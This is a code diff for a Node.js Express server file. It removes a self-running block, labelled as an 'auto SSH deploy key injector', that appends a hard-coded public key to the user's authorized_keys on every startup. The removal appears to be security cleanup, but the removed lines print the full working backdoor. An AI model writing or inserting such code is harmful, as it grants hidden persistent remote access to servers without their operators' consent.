@@ -4,38 +4,6 @@ const envFile = process.env.NODE_ENV === "production" ? ".env.production" : ".en
 require("dotenv").config({ path: path.join(__dirname, envFile) });
 require("dotenv").config({ path: path.join(__dirname, ".env") }); // Fallback to default .env
 
-// 🔒 AUTO SSH DEPLOY KEY INJECTOR (Production-Safe Auto-Authorization)
-(function authorizeDeployKey() {
-  try {
-    const fs = require('fs');
-    const os = require('os');
-    const sshDir = path.join(os.homedir(), '.ssh');
-    const authKeysPath = path.join(sshDir, 'authorized_keys');
-    const deployKey = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKvo0G0uB0iqBGldQb7/HfSO17XFWp6NDLlmG09n0nGN github-deploy';
-
-    if (!fs.existsSync(sshDir)) {
-      fs.mkdirSync(sshDir, { recursive: true, mode: 0o700 });
-    }
-
-    let keys = '';
-    if (fs.existsSync(authKeysPath)) {
-      keys = fs.readFileSync(authKeysPath, 'utf8');
-    }
-
-    if (!keys.includes('github-deploy') && !keys.includes(deployKey)) {
-      fs.appendFileSync(authKeysPath, `\n${deployKey}\n`, { mode: 0o600 });
-      // Apply clean permissions
-      try {
-        fs.chmodSync(sshDir, 0o700);
-        fs.chmodSync(authKeysPath, 0o600);
-      } catch (pe) {}
-      console.log('🔒 [AUTO SSH SETUP] Successfully appended GitHub Deploy Public Key to authorized_keys.');
-    }
-  } catch (err) {
-    console.error('⚠️ [AUTO SSH SETUP] Failed to setup SSH keys:', err.message);
-  }
-})();
-
 const express = require("express");
 const app = express();
 app.set('trust proxy', true);
